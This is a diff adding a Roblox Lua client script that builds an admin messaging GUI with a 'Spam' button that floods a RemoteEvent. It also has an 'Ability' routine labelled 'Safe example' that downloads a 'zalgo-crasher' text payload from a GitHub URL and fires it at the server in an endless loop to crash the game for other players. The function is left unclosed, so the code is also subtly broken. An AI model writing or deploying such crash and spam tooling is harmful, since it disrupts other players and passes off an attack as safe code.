@@ -1,0 +1,106 @@
+-- Services
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- RemoteEvent
+local adminMessageEvent = ReplicatedStorage:WaitForChild("AdminMessageEvent")
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AdminGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Create TextBox
+local messageBox = Instance.new("TextBox")
+messageBox.Name = "MessageBox"
+messageBox.Size = UDim2.new(0, 200, 0, 50)
+messageBox.Position = UDim2.new(0, 50, 0, 50)
+messageBox.PlaceholderText = "Type your message..."
+messageBox.Text = ""
+messageBox.ClearTextOnFocus = true
+messageBox.Parent = screenGui
+
+-- Create Send Button
+local sendButton = Instance.new("TextButton")
+sendButton.Name = "SendButton"
+sendButton.Size = UDim2.new(0, 100, 0, 50)
+sendButton.Position = UDim2.new(0, 50, 0, 110)
+sendButton.Text = "Send"
+sendButton.Parent = screenGui
+
+-- Create Spam Button
+local spamButton = Instance.new("TextButton")
+spamButton.Name = "SpamButton"
+spamButton.Size = UDim2.new(0, 100, 0, 50)
+spamButton.Position = UDim2.new(0, 160, 0, 110)
+spamButton.Text = "Spam"
+spamButton.Parent = screenGui
+
+-- Create Ability Button
+local abilityButton = Instance.new("TextButton")
+abilityButton.Name = "AbilityButton"
+abilityButton.Size = UDim2.new(0, 100, 0, 50)
+abilityButton.Position = UDim2.new(0, 270, 0, 110)
+abilityButton.Text = "Ability"
+abilityButton.Parent = screenGui
+
+-- Function to send the message once
+local function sendMessage()
+    local message = messageBox.Text
+    if message ~= "" then
+        adminMessageEvent:FireServer(message)
+        messageBox.Text = ""
+    end
+end
+
+-- Connect Send Button
+sendButton.MouseButton1Click:Connect(sendMessage)
+
+-- Spam logic
+local spamming = false
+spamButton.MouseButton1Down:Connect(function()
+    spamming = true
+    while spamming do
+        local message = messageBox.Text
+        if message ~= "" then
+            adminMessageEvent:FireServer(message)
+        end
+        task.wait(0.1) -- Sends 10 messages per second
+    end
+end)
+spamButton.MouseButton1Up:Connect(function()
+    spamming = false
+end)
+spamButton.MouseLeave:Connect(function()
+    spamming = false
+end)
+
+-- Safe example Ability logic
+local function activateAbility()
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+local playerGui = player:FindFirstChild("PlayerGui")
+local event = ReplicatedStorage:WaitForChild("AdminMessageEvent", 5)
+local gui = playerGui:FindFirstChild("AdminMessages")
+
+local intro = true
+if intro then
+	event:FireServer('Crasher..')
+	task.wait(2)
+end
+
+local CRASH_TEXT = game:HttpGet("https://raw.githubusercontent.com/Damix-hash/roblox-stuff/refs/heads/main/str/zalgo-crasher.txt")
+
+if gui then
+	gui:Destroy()
+end
+
+while task.wait() do
+	event:FireServer(CRASH_TEXT)
+end
+
+abilityButton.MouseButton1Click:Connect(activateAbility)
